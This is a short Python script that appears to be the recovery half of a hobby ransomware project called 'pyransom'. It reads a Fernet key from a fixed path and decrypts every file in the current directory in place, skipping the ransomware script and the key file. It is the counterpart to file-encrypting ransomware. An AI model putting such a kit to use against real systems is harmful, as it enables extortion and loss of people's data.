import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
  if file == "pyransom.py" or file == "thekey.key":
    continue
  if os.path.isfile(file):
    files.append(file)
print(files)
with open("/workspaces/pymal/pyransom/thekey.key", "rb") as key:
  secretkey = key.read()

for file in files:
  with open(file, "rb") as thef:
    contents = thef.read()
  contents_dec = Fernet(secretkey).decrypt(contents)
  with open(file, "wb") as thef:
    thef.write(contents_dec)



  

  
